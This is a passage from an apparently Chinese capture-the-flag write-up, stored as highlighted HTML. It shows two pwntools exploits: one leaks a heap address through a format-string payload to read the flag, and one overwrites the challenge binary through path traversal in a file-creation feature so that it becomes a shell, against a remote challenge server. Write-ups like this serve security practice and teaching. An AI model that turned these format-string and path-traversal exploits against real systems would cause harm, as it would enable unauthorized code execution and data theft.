style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">4042C8</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">0x</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">heap_addr </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">we</span><span style="color:#B5695977">'</span><span style="color:#1e754f">)</span><span style="color:#1e754f">[</span><span style="color:#999999">:</span><span style="color:#AB5959">-</span><span style="color:#2F798A">2</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">'heap_addr: </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">heap_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">flag </span><span style="color:#999999">=</span><span style="color:#393A34"> heap_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1e0</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">exit</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">1</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">?</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">flag</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#DBD7CAEE">p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">./chall</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">exit</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">?</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">255</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">opened user.log, please report:</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">q</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">%9$p%12$s</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">exit</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">?</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># gdb.attach(p, 'b *0x4014bc')</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">4042C8</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">0x</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">heap_addr </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">we</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">)</span><span style="color:#4d9375">[</span><span style="color:#666666">:</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'heap_addr: </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">heap_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">flag </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> heap_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">1e0</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">exit</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">?</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">flag</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="filesystem" class="scroll-target"><a href="#filesystem"><code class="hash inline-code">#</code>Filesystem</a></h2>
<p>结构体如下：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#AB5959">struct</span><span style="color:#393A34"> filesystem</span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">    char</span><span style="color:#B07D48"> filename</span><span style="color:#1e754f">[</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">30</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    char</span><span style="color:#B07D48"> content</span><span style="color:#1e754f">[</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">a0</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    short</span><span style="color:#393A34"> length</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    size_t*</span><span style="color:#393A34"> fileptr</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> filesystem</span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">    char</span><span style="color:#BD976A"> filename</span><span style="color:#4d9375">[</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">30</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    char</span><span style="color:#BD976A"> content</span><span style="color:#4d9375">[</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">a0</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    short</span><span style="color:#DBD7CAEE"> length</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    size_t*</span><span style="color:#DBD7CAEE"> fileptr</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><span style="color:#666666">;</span><br></code></pre></div>
<p>想了半天没想出来怎么打，但是程序 <code class="inline-code">的create_file</code> 功能里面有路径穿越可以直接根据 dockerfile 里面的程序路径覆盖程序：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><br><span style="color:#393A34">filename </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">./chall</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">arch</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">amd64</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">terminal </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">tmux</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">neww</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">local </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">all_logs </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">filename</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">libc</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> local</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">filename</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">else</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">8.147.135.195</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A"> 30722</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> debug</span><span style="color:#2993a3">(</span><span style="color:#393A34">params</span><span style="color:#AB5959">=</span><span style="color:#B5695977">''</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> an_log </span><span style="color:#1E754F">in</span><span style="color:#393A34"> all_logs</span><span style="color:#999999">:</span><br><span style="color:#393A34">        success</span><span style="color:#2993a3">(</span><span style="color:#393A34">an_log</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pid </span><span style="color:#999999">=</span><span style="color:#393A34"> util</span><span style="color:#999999">.</span><span style="color:#393A34">proc</span><span style="color:#999999">.</span><span style="color:#393A34">pidof</span><span style="color:#2993a3">(</span><span style="color:#393A34">sh</span><span style="color:#2993a3">)</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    params </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">decompiler connect ida --host localhost --port 3662</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> params</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">pid</span><span style="color:#999999">,</span><span style="color:#393A34"> params</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pause</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> leak_info</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#999999">,</span><span style="color:#393A34"> addr</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    output_log </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#A65E2B">{}</span><span style="color:#B56959"> => </span><span style="color:#A65E2B">{}</span><span style="color:#B5695977">'</span><span style="color:#999999">.</span><span style="color:#393A34">format</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#999999">,</span><span style="color:#998418"> hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">addr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    all_logs</span><span style="color:#999999">.</span><span style="color:#393A34">append</span><span style="color:#2993a3">(</span><span style="color:#393A34">output_log</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    success</span><span style="color:#2993a3">(</span><span style="color:#393A34">output_log</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> input_dirname</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">input DirectoryName: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> name</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> creat_file</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">1</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">input filename (max length = 0x30): </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> name</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">input content (max length 0xa0): </span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> open_file</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">2</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">input filename (max length = 0x30): </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> name</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> edit_file</span><span style="color:#2993a3">(</span><span style="color:#393A34">index</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">3</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">input file idx: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">index</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">input content (max length 0xa0): </span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> show_file</span><span style="color:#2993a3">(</span><span style="color:#393A34">index</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">4</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">input file idx: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">index</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#A0ADA0"># os.system("rm ./temp/*")</span><br><span style="color:#393A34">input_dirname</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">/</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># debug("b *$rebase(0x1AA4)")</span><br><span style="color:#A0ADA0"># name = b"/"*(0x30)</span><br><span style="color:#393A34">name </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">../../../../../../../home/ctf/chall</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">content </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#B5695977">"</span><br><br><span style="color:#393A34">creat_file</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">sh</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><br><span style="color:#DBD7CAEE">filename </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">./chall</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">arch</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">amd64</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">terminal </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">tmux</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">neww</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">local </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><br><span style="color:#DBD7CAEE">all_logs </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">filename</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">libc</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> local</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">filename</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">else</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">8.147.135.195</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 30722</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> debug</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">params</span><span style="color:#CB7676">=</span><span style="color:#C98A7D77">''</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> an_log </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> all_logs</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        success</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">an_log</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    pid </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> util</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pidof</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sh</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    params </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">decompiler connect ida --host localhost --port 3662</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> params</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pid</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> params</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    pause</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> leak_info</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> addr</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    output_log </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C99076">{}</span><span style="color:#C98A7D"> => </span><span style="color:#C99076">{}</span><span style="color:#C98A7D77">'</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#666666">,</span><span style="color:#B8A965"> hex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    all_logs</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output_log</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    success</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output_log</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> input_dirname</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">input DirectoryName: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> name</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> creat_file</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendafter</span><span style="color:#5eaab5">(</span><span 